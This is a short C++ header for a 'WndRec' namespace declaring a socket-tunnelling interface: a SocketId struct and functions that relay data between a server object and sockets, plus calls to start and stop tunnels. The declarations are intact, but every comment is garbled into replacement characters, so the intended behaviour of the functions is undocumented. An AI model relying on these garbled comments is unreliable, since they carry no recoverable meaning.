#pragma once

#include "manager.h"

namespace WndRec
{

//����� � ��� �� 
struct SocketId
{
	SOCKET sc;
	uint id;
	char ip[24];
	int port;
	byte type; //0 - ������ �� ��������� (���������� ����������� �������), 1 - ������� ������
	DWORD val; //�����-�� ���������� � ����������� �� ���������
};

//������������� ������� ��������� ������ �� ������������� ���������, ����������
//0 - ���� ��������� �������, 1 - ������ (������� �������), 2 - �������� ����� �������
typedef int (*ProtocolHandler)( ServerData* server, SocketId*, char* data, int szData, char* createData, int szCreate );

int FromSocketsToServer( ServerData* server, SocketId* sockets, int c_sockets, int cmdServer, int wait );
int FromServerToSockets( ServerData* server, SocketId* sockets, int& c_sockets, int cmdServer, ProtocolHandler );

//�������� ������ �� ��������� ������� 
//���������� ������ �� ProtocolHandler ��� ������ ������� �������� ���������
void SendProtocolData( ServerData* server, SocketId* si, int cmdServer, char* data, int szData );
//��������� ��� �������� ������
void CloseAllSockets( ServerData* server, SocketId* sockets, int c_sockets, int cmdServer );
//����� �������� ������� �� ���������� ������, ������� ��������� �� ����������
//������� ���������� �������� ����� �������� ������ � ������
int CompactSockets( SocketId* sockets, int c_sockets );

void InitTunnels();
bool StartTunnel( ServerData* server, int cmd, ProtocolHandler pfunc );
void StopTunnel( ServerData* server, int cmd );

}
